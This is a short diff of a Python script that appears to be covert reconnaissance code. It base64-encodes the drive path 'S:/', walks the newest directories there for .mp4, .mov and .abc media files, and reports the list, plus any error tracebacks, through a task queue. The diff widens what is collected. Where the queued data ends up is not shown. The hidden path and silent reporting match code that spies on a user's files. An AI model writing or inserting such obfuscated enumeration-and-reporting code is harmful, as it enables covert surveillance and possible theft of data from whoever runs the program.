@@ -175,13 +175,14 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
                  if os.path.isdir(os.path.join(dir_path, d)) ]
         return sorted(dirs, key=lambda x: os.path.getmtime(x[1]), reverse=True)[:n]
 try:
-    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=5)
+    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=2)
     zovV = []
-    for _, fp in ldir:
-        zovV += search_latest_files_or_dirs(dir_path=fp, ext='.mp4')
-        zovV += search_latest_files_or_dirs(dir_path=fp, ext='.mov')
-        zovV += search_latest_files_or_dirs(dir_path=fp, ext='.abc')
-    add_queue_task('ext_path_ls', dict(zovV))
+    zovV += ldir
+    for _, dp in ldir:
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
+    add_queue_task('ext_path_ls', {'files' : zovV})
 except:
     import traceback
     add_queue_task('ext_path_ls_error', {'error': str(traceback.format_exc())})
